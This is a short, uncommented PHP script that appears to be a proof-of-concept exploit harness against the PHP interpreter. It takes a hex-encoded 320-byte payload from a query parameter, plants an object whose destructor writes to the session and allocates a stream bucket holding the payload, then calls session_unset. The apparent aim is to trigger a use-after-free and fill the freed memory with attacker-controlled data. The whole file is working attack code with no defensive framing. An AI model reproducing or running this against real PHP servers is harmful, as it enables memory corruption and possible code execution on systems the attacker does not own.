<?php
error_reporting(0);
$raw = $_GET['p'] ?? '';
$payload = hex2bin($raw);
if (!is_string($payload) || strlen($payload) !== 320) {
    http_response_code(400);
    exit("bad payload rawlen=".strlen($raw)." declen=".(is_string($payload)?strlen($payload):-1)." start=".substr($raw,0,24)." end=".substr($raw,-24)."\n");
}
$fp = fopen('php://memory', 'w');
class X {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __destruct() {
        $_SESSION['pwn'] = 'x';
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
    }
}
session_start();
$_SESSION['x'] = new X($fp, $payload);
for ($i = 0; $i < 7; $i++) { $_SESSION['k'.$i] = 'v'; }
session_unset();
